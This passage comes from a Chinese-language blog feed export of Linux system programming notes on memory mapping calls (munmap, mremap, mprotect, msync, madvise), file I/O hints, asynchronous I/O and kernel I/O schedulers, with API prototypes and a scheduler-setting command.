class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">munmap</span> <span class="hljs-params">(<span class="hljs-keyword">void</span> *addr, <span class="hljs-keyword">size_t</span> len)</span></span>;</span><br></pre></td></tr></tbody></table></figure><br>&#x6210;&#x529F;&#x8FD4;&#x56DE;0&#xFF0C;&#x5931;&#x8D25;&#x8FD4;&#x56DE;-1&#x3002;<br>&#x5F53;&#x6620;&#x5C04;&#x89E3;&#x9664;&#x4E4B;&#x540E;&#xFF0C;&#x4E4B;&#x524D;&#x5173;&#x8054;&#x7684;&#x5185;&#x5B58;&#x533A;&#x57DF;&#x4E0D;&#x518D;&#x6709;&#x6548;&#xFF0C;&#x5982;&#x679C;&#x5C1D;&#x8BD5;&#x8BBF;&#x95EE;&#x5C06;&#x4EA7;&#x751F; SIGSEGV&#x4FE1;&#x53F7;&#x3002;<p></p><h4 id="&#x8C03;&#x6574;&#x6620;&#x5C04;&#x5927;&#x5C0F;-mremap"><a href="#&#x8C03;&#x6574;&#x6620;&#x5C04;&#x5927;&#x5C0F;-mremap" class="headerlink" title="&#x8C03;&#x6574;&#x6620;&#x5C04;&#x5927;&#x5C0F; mremap"></a>&#x8C03;&#x6574;&#x6620;&#x5C04;&#x5927;&#x5C0F; mremap</h4><p><strong>* mremap *</strong>&#x662F;Linux&#x7279;&#x6709;&#x7684;&#x64CD;&#x4F5C;<br>Flag&#x7684;&#x503C;&#x53EF;&#x4EE5;&#x662F;0&#x6216;&#x8005; MREMAP_MAYMOVE&#xFF0C;&#x6307;&#x5B9A;&#x5728;&#x5927;&#x5C0F;&#x8C03;&#x6574;&#x65F6;&#xFF0C;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x79FB;&#x52A8;&#x6620;&#x5C04;&#x4EE5;&#x8FBE;&#x5230;&#x5927;&#x5C0F;&#x8C03;&#x6574;&#x7684;&#x76EE;&#x7684;&#x3002;<br></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> * <span class="hljs-title">mremap</span> <span class="hljs-params">(<span class="hljs-keyword">void</span> *addr, <span class="hljs-keyword">size_t</span> old_size, <span class="hljs-keyword">size_t</span> new_size, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> flags)</span></span>;</span><br></pre></td></tr></tbody></table></figure><br>&#x6210;&#x529F;&#x8FD4;&#x56DE;&#x65B0;&#x6620;&#x5C04;&#x533A;&#x7684;&#x6307;&#x9488;&#xFF0C;&#x5931;&#x8D25;&#x8FD4;&#x56DE;MAP_FAILED<br>glibc&#x57FA;&#x4E8E;mremap&#x5B9E;&#x73B0;&#x9AD8;&#x6548;&#x7684;realloc&#xFF0C;&#x7528;&#x4E8E;&#x8C03;&#x6574;malloc&#x6240;&#x5206;&#x914D;&#x7684;&#x5927;&#x5C0F;<p></p><h4 id="&#x6539;&#x53D8;&#x6620;&#x5C04;&#x533A;&#x6743;&#x9650;-mprotect"><a href="#&#x6539;&#x53D8;&#x6620;&#x5C04;&#x533A;&#x6743;&#x9650;-mprotect" class="headerlink" title="&#x6539;&#x53D8;&#x6620;&#x5C04;&#x533A;&#x6743;&#x9650; mprotect"></a>&#x6539;&#x53D8;&#x6620;&#x5C04;&#x533A;&#x6743;&#x9650; mprotect</h4><p>&#x7528;&#x4E8E;&#x6539;&#x53D8;&#x5185;&#x5B58;&#x533A;&#x57DF;&#x7684;&#x6743;&#x9650;&#xFF0C;prot&#x53EF;&#x53D6;&#x7684;&#x503C;&#x4E3A;&#xFF1A;PROT_NONE&#x3001;PROT_READ&#x3001;PROT_WRITE&#x3001;PROT_EXEC&#x3002;Linux&#x4E0B;mprotect&#x53EF;&#x4EE5;&#x64CD;&#x4F5C;&#x4EFB;&#x610F;&#x533A;&#x57DF;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x4E5F;&#x5C31;&#x7C7B;&#x4F3C;&#x4E8E;Windows&#x4E0B;&#x7684;VirtualProtect&#xFF0C;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;NX<br></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">mprotect</span> <span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *addr, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">int</span> prot)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="&#x6620;&#x5C04;&#x673A;&#x5236;&#x540C;&#x6B65;&#x6587;&#x4EF6;-msync"><a href="#&#x6620;&#x5C04;&#x673A;&#x5236;&#x540C;&#x6B65;&#x6587;&#x4EF6;-msync" class="headerlink" title="&#x6620;&#x5C04;&#x673A;&#x5236;&#x540C;&#x6B65;&#x6587;&#x4EF6; msync"></a>&#x6620;&#x5C04;&#x673A;&#x5236;&#x540C;&#x6B65;&#x6587;&#x4EF6; msync</h4><p>&#x7528;&#x4E8E;&#x5C06;&#x6620;&#x5C04;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x6587;&#x4EF6;&#x5199;&#x56DE;&#x78C1;&#x76D8;&#xFF0C;&#x540C;&#x6B65;&#x5185;&#x5B58;&#x548C;&#x6587;&#x4EF6;&#xFF0C;addr&#x901A;&#x5E38;&#x4E3A;mmap&#x7684;&#x8FD4;&#x56DE;&#x503C;<br>flags &#x63A7;&#x5236;&#x540C;&#x6B65;&#x64CD;&#x4F5C;&#x7684;&#x884C;&#x4E3A;&#xFF1A;<br>MS_ASYNC&#xFF1A;&#x540C;&#x6B65;&#x64CD;&#x4F5C;&#x5F02;&#x6B65;&#x6267;&#x884C;<br>MS_INVALIDATE&#xFF1A;&#x6307;&#x5B9A;&#x8BE5;&#x5757;&#x6620;&#x5C04;&#x7684;&#x5176;&#x4ED6;&#x6240;&#x6709;&#x62F7;&#x8D1D;&#x90FD;&#x5C06;&#x5931;&#x6548;&#xFF0C;&#x672A;&#x6765;&#x5BF9;&#x8BE5;&#x6587;&#x4EF6;&#x4EFB;&#x610F;&#x6620;&#x5C04;&#x64CD;&#x4F5C;&#x5C06;&#x540C;&#x6B65;&#x5230;&#x78C1;&#x76D8;<br>MS_SYNC&#xFF1B;&#x540C;&#x6B65;&#x64CD;&#x4F5C;&#x540C;&#x6B65;&#x6267;&#x884C;&#xFF0C;&#x5FC5;&#x987B;&#x5199;&#x56DE;&#x78C1;&#x76D8;&#x518D;&#x8FD4;&#x56DE;<br></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">msync</span> <span class="hljs-params">(<span class="hljs-keyword">void</span> *addr, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">int</span> flags)</span></span>;</span><br></pre></td></tr></tbody></table></figure><br>&#x6210;&#x529F;&#x8FD4;&#x56DE;0&#xFF0C;&#x5931;&#x8D25;&#x8FD4;&#x56DE;-1<p></p><h4 id="&#x6620;&#x5C04;&#x63D0;&#x793A;"><a href="#&#x6620;&#x5C04;&#x63D0;&#x793A;" class="headerlink" title="&#x6620;&#x5C04;&#x63D0;&#x793A;"></a>&#x6620;&#x5C04;&#x63D0;&#x793A;</h4><p>&#x8BA9;&#x8FDB;&#x7A0B;&#x5728;&#x5982;&#x4F55;&#x8BBF;&#x95EE;&#x6620;&#x5C04;&#x533A;&#x57DF;&#x4E0A;** &#x7ED9;&#x5185;&#x6838;&#x4E00;&#x5B9A;&#x7684;&#x63D0;&#x793A; **&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;&#x7ED9;&#x5185;&#x6838;&#x53D1;&#x9001;&#x4E00;&#x4E9B;&#x63D0;&#x793A;&#x6D88;&#x606F;&#x3002;<br></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">madvise</span> <span class="hljs-params">(<span class="hljs-keyword">void</span> *addr, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">int</span> advice)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="&#x666E;&#x901A;&#x6587;&#x4EF6;I-O&#x63D0;&#x793A;"><a href="#&#x666E;&#x901A;&#x6587;&#x4EF6;I-O&#x63D0;&#x793A;" class="headerlink" title="&#x666E;&#x901A;&#x6587;&#x4EF6;I/O&#x63D0;&#x793A;"></a>&#x666E;&#x901A;&#x6587;&#x4EF6;I/O&#x63D0;&#x793A;</h3><p>&#x666E;&#x901A;&#x6587;&#x4EF6;I/O&#x64CD;&#x4F5C;&#x65F6;&#xFF0C;** &#x7ED9;&#x5185;&#x6838;&#x4E00;&#x5B9A;&#x7684;&#x63D0;&#x793A; **<br>&#x4E24;&#x4E2A;&#x63A5;&#x53E3; posix_fadvise &#x548C; readahead(Linux&#x7279;&#x6709;)<br></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">posix_fadvise</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">off_t</span> offset, <span class="hljs-keyword">off_t</span> len, <span class="hljs-keyword">int</span> advice)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">readahead</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">off64_t</span> offset, <span class="hljs-keyword">size_t</span> count)</span></span>;</span><br></pre></td></tr></tbody></table></figure><br>&#x4E00;&#x4E2A;&#x5F88;&#x4F7F;&#x7528;&#x7684;&#x573A;&#x666F;&#xFF0C;&#x5F53;&#x8BFB;&#x53D6;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x7684;&#x5927;&#x90E8;&#x5206;&#x5185;&#x5BB9;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x5148;&#x901A;&#x77E5;&#x5185;&#x6838; &#x8981;&#x8FDB;&#x884C;&#x9884;&#x8BFB;&#x6570;&#x636E;&#xFF0C;&#x8BBE;&#x7F6E;POSIX_FADV_SEQUENTIAL&#xFF0C;&#x63D0;&#x793A;&#x8981;&#x5927;&#x91CF;&#x9884;&#x8BFB;&#xFF1B;&#x82E5;&#x662F;&#x53EA;&#x8BFB;&#x5F88;&#x5C11;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x540E;&#x9762;&#x6CA1;&#x6709;&#x8BFB;&#x64CD;&#x4F5C;&#xFF0C;&#x90A3;&#x4E48;&#x8BBE;&#x7F6E;POSIX_FADV_RANDOM&#x63D0;&#x793A;&#x7981;&#x6B62;&#x9884;&#x8BFB;&#x6548;&#x679C;&#x4F1A;&#x66F4;&#x597D;&#x3002;<p></p><h3 id="&#x540C;&#x6B65;-Synchronized-&#x540C;&#x6B65;-Synchronous-&#x548C;-&#x5F02;&#x6B65;-Asynchronous"><a href="#&#x540C;&#x6B65;-Synchronized-&#x540C;&#x6B65;-Synchronous-&#x548C;-&#x5F02;&#x6B65;-Asynchronous" class="headerlink" title="&#x540C;&#x6B65;(Synchronized), &#x540C;&#x6B65;(Synchronous) &#x548C; &#x5F02;&#x6B65;(Asynchronous)"></a>&#x540C;&#x6B65;(Synchronized), &#x540C;&#x6B65;(Synchronous) &#x548C; &#x5F02;&#x6B65;(Asynchronous)</h3><p>Synchronized &#x5199;&#x64CD;&#x4F5C;&#x628A;&#x6570;&#x636E;&#x5199;&#x56DE;&#x786C;&#x76D8;&#xFF0C;&#x5E76;&#x786E;&#x4FDD;&#x786C;&#x76D8;&#x4E0A;&#x7684;&#x6570;&#x636E;&#x548C;&#x5185;&#x6838;&#x7F13;&#x51B2;&#x533A;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x662F;&#x540C;&#x6B65;&#x7684;&#xFF1B;<br>Synchronous &#x5199;&#x64CD;&#x4F5C;&#x4FDD;&#x8BC1;&#x6570;&#x636E;&#x5168;&#x90E8;&#x5199;&#x5165;&#x5230;&#x5185;&#x6838;&#x7F13;&#x51B2;&#x533A;&#xFF0C;&#x5E76;&#x4E0D;&#x6D89;&#x53CA;&#x5230;&#x78C1;&#x76D8;</p><p>Synchronous &#x8BFB;&#x64CD;&#x4F5C;&#x786E;&#x4FDD;&#x6570;&#x636E;&#x5199;&#x9053;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5728;&#x7528;&#x6237;&#x7A7A;&#x95F4;&#x7F13;&#x51B2;&#x533A;(&#x5373;&#x5199;&#x5165;&#x7528;&#x6237;&#x7F13;&#x51B2;&#x533A;)<br>Synchronized &#x786E;&#x4FDD;&#x8FD4;&#x56DE;&#x7684;&#x662F;&#x6700;&#x65B0;&#x7684;&#x6570;&#x636E;&#x5230;&#x53D8;&#x91CF;&#x5185;&#x5B58;</p><h4 id="&#x5F02;&#x6B65;I-O"><a href="#&#x5F02;&#x6B65;I-O" class="headerlink" title="&#x5F02;&#x6B65;I/O"></a>&#x5F02;&#x6B65;I/O</h4><p>Linux &#x4E0B;&#x7684; aio&#x5E93;&#xFF0C;&#x7528;&#x4E8E;&#x5F02;&#x6B65;&#x8BFB;&#x5199;&#x7B49;&#x64CD;&#x4F5C;&#x63A5;&#x53E3;<br></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;aio.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">aio_read</span> <span class="hljs-params">(struct aiocb *aiocbp)</span></span>;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">aio_write</span> <span class="hljs-params">(struct aiocb *aiocbp)</span></span>;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">aio_error</span> <span class="hljs-params">(<span class="hljs-keyword">const</span> struct aiocb *aiocbp)</span></span>;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">aio_return</span> <span class="hljs-params">(struct aiocb *aiocbp)</span></span>;</span><br><span class="line">(......)</span><br></pre></td></tr></tbody></table></figure><br>Linux &#x53EA;&#x652F;&#x6301;&#x4F7F;&#x7528;O_DIRECT&#x6807;&#x5FD7;&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x4E0A;&#x7684;aio&#x3002;<p></p><h3 id="I-O&#x8C03;&#x5EA6;&#x5668;-&#x548C;-I-O&#x6027;&#x80FD;"><a href="#I-O&#x8C03;&#x5EA6;&#x5668;-&#x548C;-I-O&#x6027;&#x80FD;" class="headerlink" title="I/O&#x8C03;&#x5EA6;&#x5668; &#x548C; I/O&#x6027;&#x80FD;"></a>I/O&#x8C03;&#x5EA6;&#x5668; &#x548C; I/O&#x6027;&#x80FD;</h3><p>&#x4E3B;&#x8981;&#x662F;&#x5728;&#x5BF9;&#x78C1;&#x76D8;&#x4E2D;&#x6570;&#x636E;&#x7684;&#x8BBF;&#x95EE;&#x6548;&#x7387;&#x5F88;&#x4F4E;&#xFF0C;&#x901A;&#x8FC7;&#x4E00;&#x4E9B;&#x65B9;&#x5F0F;&#x6765;&#x4F18;&#x5316;&#x5BF9;&#x78C1;&#x76D8;&#x7684;&#x64CD;&#x4F5C;&#x3002;</p><h4 id="&#x78C1;&#x76D8;&#x5BFB;&#x5740;"><a href="#&#x78C1;&#x76D8;&#x5BFB;&#x5740;" class="headerlink" title="&#x78C1;&#x76D8;&#x5BFB;&#x5740;"></a>&#x78C1;&#x76D8;&#x5BFB;&#x5740;</h4><p>&#x786C;&#x76D8;&#x57FA;&#x4E8E; &#x67F1;&#x9762;(cylinders)&#x3001;&#x78C1;&#x5934;(heads)&#x3001;&#x6247;&#x533A;(section)&#x6765;&#x786E;&#x5B9A;&#x5730;&#x5740;&#xFF0C;CHS&#x5BFB;&#x5740;<br>&#x4E00;&#x4E2A;&#x786C;&#x76D8;&#x770B;&#x6210;&#x662F;&#x4E00;&#x4E2A;&#x5706;&#x67F1;&#x4F53;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x6210;&#x662F;&#x6709;&#x591A;&#x4E2A;&#x5706;&#x5F62;&#x6210;&#xFF0C;&#x6BCF;&#x4E2A;&#x5706;&#x79F0;&#x4E4B;&#x4E3A;&#x4E00;&#x4E2A;&#x76D8;&#x7247;&#x3002;&#x67F1;&#x9762;&#x5219;&#x662F;&#x6240;&#x6709;&#x4E0E;&#x5706;&#x4E2D;&#x5FC3;&#x8DDD;&#x79BB;&#x76F8;&#x7B49;&#x7684;&#x70B9;&#x6240;&#x7EC4;&#x6210;&#x7684;&#x4E00;&#x4E2A;&#x5706;&#x8868;&#x9762;&#x3002;<br>** &#x5BFB;&#x5740; **&#xFF1A;&#x67F1;&#x9762;&#x786E;&#x5B9A;&#x4E86;&#x4E00;&#x4E2A;&#x5B50;&#x5706;&#x67F1;&#x8868;&#x9762;&#xFF1B;&#x78C1;&#x5934;&#x786E;&#x5B9A;&#x4E86;&#x6240;&#x5904;&#x7684;&#x76D8;&#x7247;&#xFF1B;&#x6247;&#x533A;&#x5219;&#x786E;&#x5B9A;&#x4E86;&#x8BE5;&#x76D8;&#x7247;&#x4E2D;&#x7684;&#x786E;&#x5207;&#x4F4D;&#x7F6E;&#x3002;</p><h4 id="&#x8C03;&#x5EA6;&#x5668;&#x7684;&#x4F18;&#x5316;"><a href="#&#x8C03;&#x5EA6;&#x5668;&#x7684;&#x4F18;&#x5316;" class="headerlink" title="&#x8C03;&#x5EA6;&#x5668;&#x7684;&#x4F18;&#x5316;"></a>&#x8C03;&#x5EA6;&#x5668;&#x7684;&#x4F18;&#x5316;</h4><p>&#x8C03;&#x5EA6;&#x5668;&#x7684;&#x4F18;&#x5316;&#x5305;&#x62EC;2&#x4E2A;&#x90E8;&#x5206;&#xFF1A;</p><ol><li>&#x5408;&#x5E76;&#xFF0C;&#x5BF9;&#x4E00;&#x4E9B;&#x76F8;&#x90BB;&#x5757;&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x8FDB;&#x884C;&#x5408;&#x5E76;&#x4E00;&#x6B21;&#x64CD;&#x4F5C;</li><li>&#x6392;&#x5E8F;&#xFF0C;&#x6309;&#x7167;&#x5757;&#x53F7;&#x9012;&#x589E;&#x7684;&#x987A;&#x5E8F;&#x4F9D;&#x6B21;&#x8BBF;&#x95EE;&#x78C1;&#x76D8;&#xFF0C;&#x8FD9;&#x6837;&#x51CF;&#x5C11;&#x4E86;&#x78C1;&#x76D8;&#x5934;&#x7684;&#x79FB;&#x52A8;&#x8DDD;&#x79BB;<h4 id="&#x6539;&#x5584;&#x8BFB;&#x8BF7;&#x6C42;"><a href="#&#x6539;&#x5584;&#x8BFB;&#x8BF7;&#x6C42;" class="headerlink" title="&#x6539;&#x5584;&#x8BFB;&#x8BF7;&#x6C42;"></a>&#x6539;&#x5584;&#x8BFB;&#x8BF7;&#x6C42;</h4>&#x8BFB;&#x8BF7;&#x6C42;&#x7684;&#x51E0;&#x79CD;&#x4F18;&#x5316;&#x7B97;&#x6CD5;</li><li>Deadline I/O &#x8C03;&#x5EA6;&#x5668;<br>&#x7EF4;&#x62A4;&#x4E86;&#x4E09;&#x4E2A;&#x961F;&#x5217;&#xFF0C;&#x4E00;&#x4E2A;&#x6807;&#x51C6;&#x7684;&#x961F;&#x5217;&#xFF0C;&#x662F;&#x7ECF;&#x8FC7;&#x6392;&#x5E8F;&#x7684;I/O&#x7B49;&#x5F85;&#x5217;&#x8868;(&#x4E00;&#x822C;&#x90FD;&#x662F;&#x6309;&#x7167;&#x5757;&#x53F7;&#x6392;&#x5E8F;)&#xFF1B;&#x4E24;&#x4E2A;FIFO&#x961F;&#x5217;&#xFF0C;&#x4E00;&#x4E2A;&#x5904;&#x7406;&#x8BFB;&#x64CD;&#x4F5C;&#xFF0C;&#x4E00;&#x4E2A;&#x5904;&#x7406;&#x5199;&#x64CD;&#x4F5C;&#x3002;<br>&#x5F53;&#x6765;&#x4E00;&#x4E2A;&#x8BF7;&#x6C42;&#x540E;&#xFF0C;&#x4F1A;&#x9996;&#x5148;&#x63D2;&#x5165;&#x5230;&#x6807;&#x51C6;&#x961F;&#x5217;&#x4E2D;&#xFF0C;&#x5E76;&#x4F9D;&#x636E;&#x8BFB;&#x5199;&#xFF0C;&#x653E;&#x5728;&#x6307;&#x5B9A;&#x7684;FIFO&#x961F;&#x5217;&#x961F;&#x5C3E;&#xFF0C;&#x5BF9;&#x4E8E;FIFO&#x961F;&#x5217;&#x7684;&#x6BCF;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#x90FD;&#x5C06;&#x8BBE;&#x7F6E;&#x4E00;&#x4E2A;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#x3002;&#x4E00;&#x822C;&#x60C5;&#x51B5;&#xFF0C;&#x786C;&#x76D8;&#x603B;&#x662F;&#x5148;&#x4ECE;&#x6807;&#x51C6;&#x961F;&#x5217;&#x961F;&#x5934;&#x9009;&#x62E9;&#x4E00;&#x4E2A;&#x64CD;&#x4F5C;&#xFF0C;&#x82E5;FIFO&#x961F;&#x5217;&#x5934;&#x8D85;&#x8FC7;&#x4E86;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#xFF0C;&#x5C06;&#x4F18;&#x5148;&#x5904;&#x7406;FIFO&#x961F;&#x5217;&#x4E2D;&#x7684;&#x8BF7;&#x6C42;&#x3002;</li><li>Anticipatory I/O &#x8C03;&#x5EA6;&#x5668;<br>&#x8BE5;&#x65B9;&#x6CD5;&#x662F;&#x4E3A;&#x4E86;&#x4F18;&#x5316;&#x8FD9;&#x4E48;&#x4E00;&#x4E2A;&#x60C5;&#x51B5;&#xFF1A;&#x5F53;&#x5EF6;&#x8FDF;&#x5F88;&#x5C0F;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x4F1A;&#x7ECF;&#x5E38;&#x6027;&#x7684;&#x51FA;&#x73B0;&#x8FC7;&#x671F;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x9700;&#x8981;&#x5904;&#x7406;FIFO&#x7684;&#x8BF7;&#x6C42;&#xFF1B;&#x4F46;&#x662F;&#x7A0D;&#x5FAE;&#x7B49;&#x5F85;&#x4E00;&#x4F1A;&#x4F1A;&#x6709;&#x53E6;&#x4E00;&#x4E2A;&#x76F8;&#x90BB;&#x4F4D;&#x7F6E;&#x7684;&#x8BF7;&#x6C42;&#x5B58;&#x5728;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x53EF;&#x4EE5;&#x4E00;&#x8D77;&#x5904;&#x7406;&#x8282;&#x7701;&#x5BFB;&#x9053;&#x65F6;&#x95F4;&#x4E86;&#x3002;<br>&#x5176;&#x4E3B;&#x8981;&#x601D;&#x60F3;&#x5C31;&#x662F;&#x5728;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#x5230;&#x6765;&#x540E;&#xFF0C;&#x4E0D;&#x7ACB;&#x9A6C;&#x54CD;&#x5E94;&#x800C;&#x662F;&#x7B49;&#x5F85;&#x4E00;&#x4F1A;&#xFF0C;&#x5982;&#x679C;&#x5728;&#x6307;&#x5B9A;&#x65F6;&#x95F4;&#x5185;&#x6536;&#x5230;&#x540C;&#x4E00;&#x90E8;&#x5206;&#x7684;&#x53E6;&#x4E00;&#x6B21;&#x8BFB;&#x8BF7;&#x6C42;&#xFF0C;&#x5C06;&#x7ACB;&#x9A6C;&#x88AB;&#x54CD;&#x5E94;&#xFF1B;&#x82E5;&#x6CA1;&#x6709;&#x54CD;&#x5E94;&#xFF0C;&#x5219;&#x8BA4;&#x4E3A;&#x9884;&#x6D4B;&#x5931;&#x8D25;&#xFF0C;&#x56DE;&#x5F52;&#x6B63;&#x5E38;&#x64CD;&#x4F5C;&#x3002;</li><li>CFQ I/O &#x8C03;&#x5EA6;&#x5668;<br>CFQ(complete Fair Queuing) &#x4E3B;&#x8981;&#x662F;&#x5E94;&#x7528;&#x4E8E;&#x591A;&#x8FDB;&#x7A0B;&#x7684;&#x5904;&#x7406;&#xFF0C;&#x5BF9;&#x4E8E;&#x6BCF;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x63D0;&#x4F9B;&#x4E00;&#x4E2A;&#x961F;&#x5217;&#x3002;</li><li>Noop I/O &#x8C03;&#x5EA6;&#x5668;<br>&#x53EA;&#x505A;&#x7B80;&#x5355;&#x7684;&#x5408;&#x5E76;&#xFF0C;&#x4E0D;&#x505A;&#x6392;&#x5E8F;&#x64CD;&#x4F5C;&#x3002;</li></ol><p>** &#x914D;&#x7F6E;I/O&#x8C03;&#x5EA6;&#x5668; ** &#x5728;&#x542F;&#x52A8;&#x65F6;&#x901A;&#x8FC7;&#x5185;&#x6838;&#x53C2;&#x6570;iosched&#x6765;&#x6307;&#x5B9A;&#xFF0C;&#x6709;&#x6548;&#x9009;&#x9879;&#x4E3A; as&#x3001;cfq&#x3001;deadline&#x548C;noop&#xFF1B;&#x8FD0;&#x884C;&#x65F6;&#x901A;&#x8FC7;&#x4E0B;&#x9762;&#x64CD;&#x4F5C;&#x8BBE;&#x7F6E;&#x3002;<br></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#echo cfq &gt;/sys/block/hda/queue/scheduler</span></span><br></pre></td></tr></tbody></table></figure><br><strong>* /sys/block/device/queue/iosched *</strong> &#x76EE;&#x5F55;&#x4E0B;&#x5305;&#x542B;&#x7BA1;&#x7406;&#x5458;&#x53EF;&#x4EE5;&#x83B7;&#x5F97;&#x548C;&#x8BBE;&#x7F6E;&#x7684;I/O&#x8C03;&#x5EA6;&#x5668;&#x9009;&#x9879;&#x3002;<p></p></body></html>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> basic </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 系统编程导读 - 缓冲输入输出</title>
      <link href="/2017/10/02/Linux-System-Programming-2/"/>
      <url>/2017/10/02/Linux-System-Programming-2/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h3 id="&#x7B80;&#x4ECB;"><a href="#&#x7B80;&#x4ECB;" class="headerlink" title="&#x7B80;&#x4ECB;"></a>&#x7B80;&#x4ECB;</h3><p>&#x672C;&#x7AE0;&#x4E3B;&#x8981;&#x4ECB;&#x7ECD;C&#x6240;&#x63D0;&#x4F9B;&#x7684;&#x6807;&#x51C6;I/O&#x64CD;&#x4F5C;&#x3002;&#x4E0D;&#x540C;&#x4E8E;&#x524D;&#x9762;&#x7684;open&#x53EA;&#x80FD;&#x5728;Linux&#x4E0A;&#x88AB;&#x652F;&#x6301;&#xFF0C;C&#x6807;&#x51C6;&#x63A5;&#x53E3;&#x80FD;&#x591F;&#x5728;&#x4E0D;&#x540C;&#x7CFB;&#x7EDF;&#x4E2D;&#x88AB;&#x652F;&#x6301;&#x3002;&#x4E24;&#x4E2A;&#x57FA;&#x672C;&#x7684;&#x6982;&#x5FF5;&#xFF0C;&#x5173;&#x4E8E;&#x5E95;&#x5C42;&#x7684;I/O&#x64CD;&#x4F5C;&#xFF0C;&#x6548;&#x7387;&#x95EE;&#x9898;&#x3002;</p><ol><li>&#x78C1;&#x76D8;&#xFF0C;&#x8BFB;&#x5199;&#x6700;&#x4E0B;&#x5C42;&#x5C31;&#x662F;&#x78C1;&#x76D8;&#x7684;&#x64CD;&#x4F5C;&#x3002;&#x6240;&#x6709;&#x7684;&#x78C1;&#x76D8;&#x64CD;&#x4F5C;&#x90FD;&#x662F;&#x57FA;&#x4E8E;&#x5757;&#x8FDB;&#x884C;&#xFF0C;&#x8FD9;&#x53E5;&#x8BDD;&#x7684;&#x